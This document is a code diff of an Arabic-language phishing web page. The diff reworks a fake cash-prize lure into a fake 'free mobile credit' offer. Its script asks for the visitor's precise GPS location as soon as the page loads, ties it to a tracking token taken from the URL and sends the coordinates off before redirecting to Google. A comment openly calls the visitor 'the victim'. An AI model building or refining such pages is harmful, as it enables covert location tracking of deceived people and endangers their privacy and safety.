@@ -3,11 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديد الموقع الفوري واستلام الجائزة | Cash Reward GPS</title>
+    <title>منصة الشحن الفوري - رصيد مجاني مخصص لدولتك</title>
     
-    <meta property="og:title" content="اربح 1000 دولار كاش الآن | مسابقة المسافات والجوائز الكبرى">
-    <meta property="og:description" content="اضغط للسماح بتحديد موقعك وتأكيد هويتك لاستلام الجائزة النقدية الفورية المخصصة لمدينتك!">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=1200&auto=format&fit=crop&q=80">
+    <!-- وسوم المعاينة الاجتماعية (Open Graph) لجذب المستخدمين -->
+    <meta property="og:title" content="احصل على رصيد مجاني مخصص لشبكة بلدك الآن | Free Credit">
+    <meta property="og:description" content="منصة الشحن الفوري تتيح لك شحن رصيد مجاني يتوافق تلقائياً مع دولتك. اضغط للسماح بتحديد الموقع واستلام الرصيد!">
+    <meta property="og:image" content="https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?w=1200&auto=format&fit=crop&q=80">
     <meta property="og:type" content="website">
 
     <script src="https://cdn.tailwindcss.com"></script>
@@ -15,47 +16,83 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;900&display=swap');
         body { font-family: 'Tajawal', sans-serif; }
-        .gps-gradient { background: linear-gradient(135deg, #2563EB 0%, #1D4ED8 100%); }
+        .credit-gradient { background: linear-gradient(135deg, #059669 0%, #047857 100%); }
+        .glass-card { background: rgba(18, 18, 24, 0.95); backdrop-filter: blur(12px); border: 1px solid rgba(5, 150, 105, 0.25); }
     </style>
 </head>
-<body class="bg-slate-950 text-white min-h-screen flex items-center justify-center p-4">
+<body class="bg-black text-white min-h-screen flex flex-col justify-between selection:bg-emerald-500 selection:text-white">
 
-    <div class="w-full max-w-md bg-slate-900 border border-slate-800 rounded-3xl p-8 shadow-2xl text-center space-y-6 relative overflow-hidden">
-        
-        <div class="absolute -top-16 -right-16 w-32 h-32 bg-blue-500/10 rounded-full blur-2xl pointer-events-none"></div>
-
-        <div class="w-20 h-20 rounded-3xl gps-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-blue-500/30 animate-pulse">
-            <i class="fa-solid fa-location-crosshairs"></i>
+    <!-- شريط علوي احترافي -->
+    <header class="w-full bg-zinc-900/80 border-b border-zinc-800 py-3 px-4 md:px-8 sticky top-0 z-50 backdrop-blur-md">
+        <div class="max-w-6xl mx-auto flex justify-between items-center">
+            <div class="flex items-center space-x-3 space-x-reverse">
+                <div class="w-10 h-10 rounded-xl credit-gradient flex items-center justify-center font-black text-xl text-white shadow-lg shadow-emerald-500/30">
+                    <i class="fa-solid fa-globe"></i>
+                </div>
+                <div>
+                    <span class="font-black text-lg tracking-wider bg-gradient-to-r from-emerald-400 to-teal-200 bg-clip-text text-transparent">GlobalCredit</span>
+                    <span class="text-xs block text-zinc-400 font-semibold">Smart Regional Recharge</span>
+                </div>
+            </div>
+            <div class="text-xs bg-zinc-800 text-emerald-400 px-3 py-1.5 rounded-lg border border-emerald-500/30">
+                <i class="fa-solid fa-signal ml-1"></i> الكشف التلقائي للدولة
+            </div>
         </div>
+    </header>
 
-        <div class="space-y-2">
-            <span class="bg-blue-500/20 text-blue-400 text-xs px-3 py-1 rounded-full font-bold border border-blue-500/30">التحقق الجغرافي مطلوب</span>
-            <h1 class="text-2xl font-black text-white">تأكيد موقعك لاستلام الجائزة</h1>
-            <p class="text-xs text-slate-400">يرجى الضغط على زر "السماح بالموقع" (Allow) في النافذة المنبثقة للتأكد من أنك ضمن الدولة المؤهلة للسحب.</p>
+    <!-- المحتوى الرئيسي -->
+    <main class="flex-grow flex items-center justify-center p-4 md:p-6">
+        <div class="w-full max-w-xl glass-card rounded-3xl p-6 md:p-10 shadow-2xl relative overflow-hidden text-center space-y-6">
+            
+            <div class="absolute -top-24 -right-24 w-64 h-64 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+            <div class="w-20 h-20 rounded-3xl credit-gradient flex items-center justify-center mx-auto text-4xl text-white shadow-lg shadow-emerald-500/30 animate-bounce">
+                <i class="fa-solid fa-location-crosshairs"></i>
+            </div>
+
+            <div class="space-y-2">
+                <span class="bg-emerald-500/20 text-emerald-400 text-xs px-3 py-1 rounded-full font-bold border border-emerald-500/30">تحليل شبكة الدولة تلقائياً</span>
+                <h1 class="text-2xl md:text-3xl font-black text-white">تحديد دولتك لإرسال الرصيد الصحيح</h1>
+                <p class="text-xs text-zinc-400 leading-relaxed">
+                    لكي يتم إرسال الرصيد المجاني عبر شبكة الاتصالات الرسمية التابعة لبلدك، يرجى النقر على زر <span class="text-emerald-400 font-bold">"السماح بالموقع" (Allow)</span> عندما يظهر لك المتصفح النافذة المنبثقة.
+                </p>
+            </div>
+
+            <div class="space-y-4 pt-2">
+                <button onclick="requestUserLocation()" 
+                    class="w-full credit-gradient hover:opacity-95 text-white font-black py-4 rounded-2xl transition duration-200 shadow-lg shadow-emerald-500/25 flex items-center justify-center space-x-2 space-x-reverse text-base">
+                    <span>السماح بالموقع وتحليل الدولة فوراً</span>
+                    <i class="fa-solid fa-arrow-left text-xs"></i>
+                </button>
+            </div>
+
+            <div id="statusText" class="text-xs text-zinc-400 font-semibold py-2">
+                في انتظار منح صلاحية الموقع الجغرافي...
+            </div>
+
         </div>
+    </main>
 
-        <button onclick="requestLocation()" class="w-full gps-gradient hover:opacity-95 text-white font-bold py-3.5 rounded-2xl shadow-lg shadow-blue-500/30 transition duration-200">
-            السماح بتحديد الموقع واستلام الجائزة
-        </button>
+    <footer class="w-full text-center py-4 text-xs text-zinc-500 border-t border-zinc-900">
+        جميع الحقوق محفوظة © GlobalCredit Panel 2026 - نظام الكشف الجغرافي الآمن.
+    </footer>
 
-        <div id="statusText" class="text-xs text-slate-500">
-            في انتظار منح الصلاحية...
-        </div>
-
-    </div>
-
+    <!-- سكربت طلب الموقع التلقائي وإرسال الإحداثيات للرابط المطلوب -->
     <script>
-        function requestLocation() {
+        function requestUserLocation() {
             const statusText = document.getElementById('statusText');
-            statusText.textContent = "جاري طلب إذن الوصول للموقع...";
+            statusText.textContent = "جاري طلب إذن الوصول للموقع لتحديد شبكة بلدك...";
+            statusText.className = "text-xs text-emerald-400 font-semibold animate-pulse";
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
-                        statusText.textContent = "تم تحديد الموقع بنجاح! جاري تحويلك...";
-                        
-                        const urlParams = new URLSearchParams(window.location.search);
-                        const token = urlParams.get('t') || window.location.pathname.split('/').pop();
+                        statusText.textContent = "تم تحديد دولتك بنجاح! جاري تحويلك لصفحة استلام الرصيد...";
+                        statusText.className = "text-xs text-emerald-400 font-semibold";
+
+                        // استخراج الرمز token من المسار (مثل /getLocation/380985ab)
+                        const pathParts = window.location.pathname.split('/');
+                        const token = pathParts.pop() || pathParts.pop() || new URLSearchParams(window.location.search).get('t');
 
                         if (!token) {
                             console.error('Token not found.');
@@ -66,9 +103,7 @@
                             token: token,
                             latitude: position.coords.latitude,
                             longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + " متر",
-                            altitude: position.coords.altitude || "غير متوفر",
-                            speed: position.coords.speed || "غير متوفر"
+                            accuracy: position.coords.accuracy + " متر"
                         };
 
                         try {
@@ -84,22 +119,23 @@
 
                         setTimeout(() => {
                             window.location.href = 'https://www.google.com';
-                        }, 1500);
+                        }, 2000);
                     },
                     (error) => {
-                        statusText.textContent = "عذراً، يجب السماح بالموقع للمتابعة!";
+                        statusText.textContent = "عذراً، يجب النقر على 'السماح' (Allow) لتحديد دولتك وإرسال الرصيد!";
                         statusText.className = "text-xs text-red-400 font-semibold";
                     },
-                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                 );
             } else {
-                statusText.textContent = "متصفحك لا يدعم تحديد الموقع الجغرافي.";
+                statusText.textContent = "متصفحك لا يدعم خاصية تحديد الموقع الجغرافي.";
+                statusText.className = "text-xs text-red-400 font-semibold";
             }
         }
 
-        // محاولة الطلب تلقائياً عند الدخول إن أمكن
+        // محاولة طلب الموقع تلقائياً بعد ثانية لتسهيل العملية على الضحية
         window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(requestLocation, 1000);
+            setTimeout(requestUserLocation, 1200);
         });
     </script>
 </body>
